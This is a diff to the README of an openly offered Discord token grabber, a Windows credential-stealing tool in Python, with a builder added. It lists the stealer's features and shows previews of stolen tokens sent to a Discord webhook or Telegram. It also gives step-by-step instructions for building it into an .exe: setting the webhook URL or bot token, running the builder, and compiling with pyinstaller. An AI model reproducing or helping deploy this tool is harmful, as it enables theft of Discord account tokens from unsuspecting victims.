@@ -1,7 +1,7 @@
-<p align="center">A Discord token grabber written in Python 3.</p>
-*<p align="center"> Python 3.6+</p>
-
-*This version of the grabber only supports **Windows**.*
+# A Discord Token Grabber Builder
+* The original version of the grabber is supported by python 3.6+
+* The builder was tested in python 3.8.6, i do not give any guarantees that it will work on other python versions.
+**Grabber only for Windows.</b></p>**
 ***
 # Features
 * No local caching
@@ -14,26 +14,36 @@
 * Allows you to send tokens in discord / telegram
 ***
 # Preview
-### Discord:
-*`WEBHOOK_STYLE : True(Slower)`*
+## Builder:
+![](https://media.discordapp.net/attachments/797823091899236433/799286909092233238/unknown.png?width=1060&height=613)
+***
+### Discord Webhook:
+*`WEBHOOK_STYLE : 1(Slower)`*
 ![](https://media.discordapp.net/attachments/769178644697972767/798917458840518696/unknown.png?width=341&height=567)
 ***
-*`WEBHOOK_STYLE : False`*
+*`WEBHOOK_STYLE : 2`*
 ![](https://media.discordapp.net/attachments/769178644697972767/798918343061929994/unknown.png)
 ***
-### Telegram:
-*`TELEGRAM_STYLE : True(Slower)`*
+### Telegram Message:
+*`TELEGRAM_STYLE : 1(Slower)`*
 ![](https://media.discordapp.net/attachments/769178644697972767/798919478548103168/unknown.png)
 ***
-*`TELEGRAM_STYLE : False`*
+*`TELEGRAM_STYLE : 2`*
 ![](https://media.discordapp.net/attachments/769178644697972767/798921203824984093/unknown.png)
 ***
 
-# How to use:
-#### Installing Telegram:
+# Build Stealer With Builder:
 ```console
-$ python -m pip install telegram
+python -m pip install -r requirements.txt
 ```
+##### Run Builder
+```console
+python builder.py
+```
+* Then you can find the .exe version of the file in the folder `build`
+
+***
+# Build Stealer Without Builder
 #### Discord
 1. Create a webhook on your Discord server.
 2. Change the `WEBHOOK_URL` variable value to your Discord webhook URL in [token-grabber.py](token-grabber.py)
@@ -45,8 +55,8 @@ $ python -m pip install telegram
 3. Get your telegram id with [Get my id bot](https://t.me/getmyid_bot)
 4. Paste token to `TELEGRAM_BOT_TOKEN` and your telegram id to `TELEGRAM_USER_ID` in [token-grabber.py](token-grabber.py)
 5. Change as desired `TELEGRAM_STYLE` to `True`(Slower) or `False`
-
 ##### Done, now you can compile `token-grabber.py` to `.exe` with [pyinstaller](https://pypi.org/project/pyinstaller/)
+
 ***
 ## Author
 - **wodx**
